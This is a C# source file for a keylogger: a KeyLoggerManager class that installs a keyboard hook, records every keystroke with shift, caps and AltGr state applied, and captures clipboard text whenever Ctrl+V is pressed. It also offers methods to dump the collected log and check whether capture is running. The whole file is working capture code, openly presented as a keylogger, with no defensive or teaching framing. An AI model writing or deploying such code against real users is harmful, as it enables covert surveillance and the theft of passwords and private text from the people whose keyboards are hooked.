using System.Windows.Forms;

namespace KeyLogger
{
    /// <summary>
    /// Class handling the key pressed events sent by the KeyboardHook
    /// </summary>
    public class KeyLoggerManager
    {
        KeyboardHook keyboardHook;

        Logger logger;

        bool capsState;

        bool altGrState;

        bool ctrlState;


        /// <summary>
        /// Initialize the keyboard hook
        /// Install the keyboard hook and the related events
        /// Instanciate the logger
        /// </summary>
        public KeyLoggerManager()
        {
            keyboardHook = new KeyboardHook();
            keyboardHook.KeyDown += KeyboardHook_KeyDown;
            keyboardHook.KeyUp += KeyboardHook_KeyUp;
            keyboardHook.Install();
            logger = new Logger();
        }


        /// <summary>
        /// Enable the hook to process keys
        /// Clear the logs
        /// </summary>
        public void StartListening()
        {
            logger.ClearLogs();

            capsState = Control.IsKeyLocked(Keys.CapsLock);
            altGrState = false;
            ctrlState = false;

            keyboardHook.listening = true;
        }


        /// <summary>
        /// Stop the hook from processing keys
        /// </summary>
        public void StopListening()
        {
            keyboardHook.listening = false;
        }


        /// <summary>
        /// When a key is pressed, process and log it
        /// </summary>
        /// <param name="key"></param>
        void KeyboardHook_KeyDown(string key)
        {
            if (key == "CAPITAL")
            {
                capsState = !capsState;
            }
            else if (key == "LSHIFT" || key == "RSHIFT")
            {
                capsState = true;
            }
            else if (key == "ALTGR")     // incorrect key
            {
                altGrState = true;
            }
            else if (key == "LCONTROL" || key == "RCONTROL")
            {
                ctrlState = true;
            }
            else if (key == "SPACE")
            {
                logger.LogKey(" ");
            }
            else if (key[0] == ':')
            {
                // Displayable special keys
                if (capsState)
                {
                    if (KeyboardKeys.SpecialShiftKeys.ContainsKey(key))
                    {
                        logger.LogKey(KeyboardKeys.SpecialShiftKeys[key]);
                    }
                }
                else if (altGrState)
                {
                    if (KeyboardKeys.SpecialAltGrKeys.ContainsKey(key))
                    {
                        logger.LogKey(KeyboardKeys.SpecialAltGrKeys[key]);
                    }
                }
                else
                {
                    logger.LogKey(KeyboardKeys.SpecialKeys[key]);
                }
            }
            else if (key.Length == 1)
            {
                // Normal characters (alpha + num)
                if ((key == "V" || key == "C") && ctrlState)
                {
                    if(key == "V")
                    {
                        logger.LogKey(" <Pasted>" + Clipboard.GetText() + "</Pasted> ");
                    }
                }
                else if (key == "E" && altGrState)
                {
                    logger.LogKey("€");
                }
                else
                {
                    logger.LogKey(capsState ? key : key.ToLower());
                }
            }
            else
            {
                // Undisplayable special chars
                logger.LogKey(" <" + key + "> ");
            }
        }


        /// <summary>
        /// When a key is released, process and log it if it's of interest
        /// </summary>
        /// <param name="key"></param>
        void KeyboardHook_KeyUp(string key)
        {
            if (key == "LSHIFT" || key == "RSHIFT")
            {
                capsState = false;
            }
            else if (key == "ALTGR")
            {
                altGrState = false;
            }
            else if (key == "LCONTROL" || key == "RCONTROL")
            {
                ctrlState = false;
            }
        }


        /// <summary>
        /// Clear all events related to the keyboard hook, discard the hook
        /// </summary>
        public void Stop()
        {
            keyboardHook.KeyDown -= KeyboardHook_KeyDown;
            keyboardHook.KeyUp -= KeyboardHook_KeyUp;
            keyboardHook.Uninstall();
        }

        
        /// <summary>
        /// Provides an access to the logger's GetLog() method outside of the namespace
        /// </summary>
        /// <returns>Log's content</returns>
        public string DumpLogs()
        {
            return logger.GetLogs();
        }


        /// <summary>
        /// Returns the hook's listening status
        /// </summary>
        /// <returns>A boolean stating the hook's listening status</returns>
        public bool GetStatus()
        {
            return keyboardHook.listening;
        }
    }
}
